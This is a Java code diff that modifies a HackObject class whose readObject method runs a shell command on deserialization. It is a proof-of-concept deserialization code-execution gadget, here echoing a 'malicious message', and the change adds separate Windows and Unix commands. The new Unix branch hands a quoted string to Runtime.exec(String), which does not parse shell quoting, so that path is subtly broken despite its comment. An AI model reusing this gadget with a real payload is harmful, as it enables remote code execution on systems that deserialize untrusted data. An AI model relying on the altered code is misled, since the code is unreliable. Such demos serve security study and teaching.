@@ -13,8 +13,18 @@ public class HackObject implements Serializable {
 
         System.out.println("[HackObject] readObject called");
 
-        String command = "echo 'Hello, this is a malicious message from the shell'";
-        Process process = Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", command});
+        // Check the operating system
+        String osName = System.getProperty("os.name").toLowerCase();
+        String command;
+        if (osName.contains("win")) {
+            // Command for Windows
+            command = "cmd.exe /c echo Hello, this is a malicious message from the shell";
+        } else {
+            // Command for macOS (and other UNIX-like systems)
+            command = "/bin/sh -c 'echo Hello, this is a malicious message from the shell'";
+        }
+
+        Process process = Runtime.getRuntime().exec(command);
 
         // Read and print the output from the command
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
